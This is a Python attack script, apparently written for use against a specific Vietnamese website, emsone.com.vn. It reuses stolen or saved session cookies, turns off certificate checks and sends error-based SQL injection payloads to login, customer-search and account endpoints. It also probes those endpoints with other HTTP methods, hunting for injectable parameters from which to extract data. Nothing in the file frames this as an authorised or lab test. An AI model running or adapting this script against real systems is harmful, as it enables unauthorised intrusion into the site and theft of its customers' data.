#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import urllib3
urllib3.disable_warnings()

class BypassExtract:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_post_endpoints(self):
        """测试POST端点"""
        print("[*] 测试POST端点...")
        
        endpoints = [
            '/Account/JLogin',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
        ]
        
        test_payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            
            # POST测试
            data = {'id': test_payload, 'q': test_payload, 'Type': test_payload}
            try:
                r = self.session.post(url, data=data, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] POST有效: {endpoint}")
                    print(f"        响应: {r.text[:300]}")
            except:
                pass
    
    def test_other_methods(self):
        """测试其他HTTP方法"""
        print("[*] 测试其他HTTP方法...")
        
        url = f"{self.base_url}/Account/GetUserInfo?id=1"
        methods = ['PUT', 'PATCH', 'DELETE', 'OPTIONS']
        
        for method in methods:
            try:
                r = self.session.request(method, url, timeout=10)
                if r.status_code != 404:
                    print(f"    [!] {method}方法: Status={r.status_code}")
            except:
                pass
    
    def test_other_account_endpoints(self):
        """测试其他Account端点"""
        print("[*] 测试其他Account端点...")
        
        endpoints = [
            '/Account/Profile',
            '/Account/Details',
            '/Account/GetProfile',
            '/Account/GetDetails',
            '/Account/GetById',
            '/Account/Get',
            '/Account/Info',
            '/Account/View',
        ]
        
        test_payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(test_payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper() or r.status_code == 200:
                    print(f"    [!] {endpoint}: Status={r.status_code}")
                    if 'TEST' in r.text:
                        print(f"        发现TEST")
            except:
                pass
    
    def test_handle_endpoints_post(self):
        """测试Handle端点POST"""
        print("[*] 测试Handle端点POST...")
        
        endpoints = [
            ('/Handle/SearchListCustomer', {'q': "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"}),
            ('/Handle/SearchListProvince', {'Type': "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"}),
        ]
        
        for endpoint, data in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                r = self.session.post(url, json=data, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] POST有效: {endpoint}")
                    print(f"        响应: {r.text[:300]}")
            except:
                pass
    
    def run_all(self):
        """执行所有绕过测试"""
        print("="*60)
        print("绕过方法测试")
        print("="*60)
        
        self.test_post_endpoints()
        self.test_other_methods()
        self.test_other_account_endpoints()
        self.test_handle_endpoints_post()
        
        print("\n[+] 测试完成")

if __name__ == "__main__":
    bypass = BypassExtract()
    bypass.run_all()